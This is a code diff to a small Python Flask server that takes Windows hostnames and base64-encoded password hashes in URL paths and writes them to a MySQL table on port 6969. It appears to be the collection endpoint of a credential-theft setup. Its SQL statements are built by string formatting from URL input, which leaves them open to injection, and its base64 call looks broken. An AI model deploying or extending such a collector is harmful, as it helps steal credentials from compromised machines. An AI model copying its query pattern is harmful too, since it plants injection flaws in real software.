@@ -59,21 +59,22 @@ def detect_hash(hostname):
         connection.commit()
         cursor.close()
     except mysql.connector.Error as error:
-        return("Failed to insert record: {}".format(error))
+        return("Failed: {}".format(error))
     return "DABALYOU"
 
 @app.route('/api/windows/upd/<hostname>/password_hashes/<value>')
 def tinotino(hostname, value):
     hostname = str(hostname)
     value = str(value)
+    insertValue = base64.decode(value)
     try:
-        mySql_insert_query = "INSERT INTO windows (hostname) VALUES ('{}') ".format(hostname)
+        mySql_insert_query = "UPDATE windows set password_hashes = '{}' where hostname ='{}'".format(insertValue, hostname)
         cursor = connection.cursor()
         cursor.execute(mySql_insert_query)
         connection.commit()
         cursor.close()
     except mysql.connector.Error as error:
-        return("Failed to insert record: {}".format(error))
+        return("Failed: {}".format(error))
     return "DABALYOU"
 
 app.run(host='0.0.0.0', port=6969)
